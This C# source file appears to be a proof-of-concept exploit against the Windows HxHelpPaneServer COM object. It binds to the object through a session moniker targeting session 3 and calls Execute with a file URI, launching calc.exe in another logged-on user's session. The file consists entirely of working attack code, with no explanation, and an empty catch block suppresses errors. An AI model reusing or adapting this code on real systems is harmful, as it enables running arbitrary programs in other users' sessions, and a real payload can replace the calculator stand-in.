using System;
using System.Runtime.InteropServices;

namespace IHxHelpPaneServer
{
    static class Program
    {
        static void Main()
        {
            var path = "file:///C:/Windows/System32/calc.exe";
            var session = System.Diagnostics.Process.GetCurrentProcess();
            Server.execute(3.ToString(), path);
        }
    }

    static class Server
    {
        [ComImport, Guid("8cec592c-07a1-11d9-b15e-000d56bfe6ee"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]
        interface IHxHelpPaneServer
        {
            void DisplayTask(string task);
            void DisplayContents(string contents);
            void DisplaySearchResults(string search);
            void Execute([MarshalAs(UnmanagedType.LPWStr)] string file);
        }

        public static void execute(string new_session_id, string path)
        {
            try
            {
                IHxHelpPaneServer server = (IHxHelpPaneServer)Marshal.BindToMoniker(String.Format("session:{0}!new:8cec58ae-07a1-11d9-b15e-000d56bfe6ee", new_session_id));
                Uri target = new Uri(path);
                server.Execute(target.AbsoluteUri);
            }
            catch
            {

            }
        }
    }
}